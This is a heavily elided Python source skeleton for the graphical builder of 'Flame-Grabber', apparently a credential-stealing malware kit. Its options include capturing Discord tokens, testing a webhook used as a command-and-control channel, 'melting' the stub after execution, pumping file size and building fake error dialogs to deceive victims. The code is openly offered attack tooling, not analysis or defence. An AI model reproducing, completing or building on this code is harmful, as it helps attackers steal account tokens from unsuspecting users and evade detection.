...
class Utility:
    ...
    def CheckConfiguration() -> None:
        ...
        if os.path.isfile(configFile):
            ...
            _password = input("New Password : (default: %r): " % Settings.Password).strip()
            if _password:
                password = _password
...
class BuilderOptionsFrame(ctk.CTkFrame):
    ...
    def __init__(self, master) -> None:
        ...
        self.testC2ButtonControl = ctk.CTkButton(self, text="Webhook Working?", height=38, font=self.font,
        ...
        self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text="Ping Me", font=self.font, height=38,
                                                     hover_color="#333534", text_color="cyan",
                                                     text_color_disabled="green", variable=self.pingMeVar)
        ...
        self.meltCheckboxControl = ctk.CTkCheckBox(self, text="Melt Stub", font=self.font, height=38,
                                                   hover_color="#333534", text_color="cyan", text_color_disabled="grey",
        ...
        self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text="Discord Tokens", font=self.font,
                                                                   height=38, hover_color="#333534", text_color="cyan",
                                                                   text_color_disabled="grey",
        ...
        self.consoleModeButtonControl.grid(row=6, column=0, sticky="ew", padx=(0, 15))
    ...
    def testC2ButtonControl_Callback(self) -> None:
        ...
        def check():
            ...
            if self.C2Mode == 0:
                ...
                try:
                    data = json.dumps(
                        {"content": "[Flame-Grabber] Crazy Stuff Your Webhook Is Workin [@everyone]"}).encode()
                    ...
                    status = http.status
                    if status == 204:
                        messagebox.showinfo("Flame-Grabber", "Webhook Works ;)")
                    else:
                        messagebox.showwarning("Flame-Grabber", "Shit Webhook Aint Workin")
                except Exception:
                    messagebox.showwarning("Flame-Grabber", "Unable to connect to the webhook!")
...
class PumperSettings(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        ...
        self.title("Flame-Grabber <File Pumper>")
...
class FakeErrorBuilder(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("Flame-Grabber <Fake Error Builder>")
        self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        self.grab_set()
...
class Builder(ctk.CTk):
    ...
    def __init__(self) -> None:
        ...
        self.title("Flame-Grabber <Builder>")
        ...
        self.titleLabel = ctk.CTkLabel(self, text="[Flame-Grabber]", font=ctk.CTkFont(size=68, weight="bold"),
                                       text_color="#12f2fa")
